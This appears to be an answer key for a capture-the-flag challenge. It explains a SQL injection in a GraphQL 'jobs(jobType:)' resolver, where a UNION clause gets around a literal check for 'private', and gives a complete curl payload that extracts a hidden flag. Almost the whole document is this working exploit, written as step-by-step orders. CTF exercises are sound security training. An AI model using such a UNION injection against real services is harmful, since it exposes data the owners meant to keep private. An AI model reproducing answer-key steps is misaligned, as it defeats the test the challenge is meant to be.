# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: SQL injection via a GraphQL field argument. The `jobs(jobType:)`
resolver concatenates `jobType` straight into a SQLite query; the only guard is a
literal `== 'private'` check on the raw argument, which a UNION bypasses. The flag
is the `description` of the `private` job.

1. **Send a UNION injection** through the GraphQL `jobType` argument that is not
   literally `private` but reaches the private row at the SQL level:

   ```
   curl -s -X POST http://<target>/graphql/ -H "Content-Type: application/json" \
     -d '{"query":"query { jobs(jobType: \"nonexistent'"'"' UNION SELECT * FROM jobs WHERE type='"'"'private'"'"' -- \") { id name type description } }"}'
   ```

   This builds `... WHERE type = 'nonexistent' UNION SELECT * FROM jobs WHERE
   type='private' --'`, unioning in the hidden row.

2. **Extract the flag** (`FLAG{...}`) from the `description` in the JSON response
   and report it verbatim.
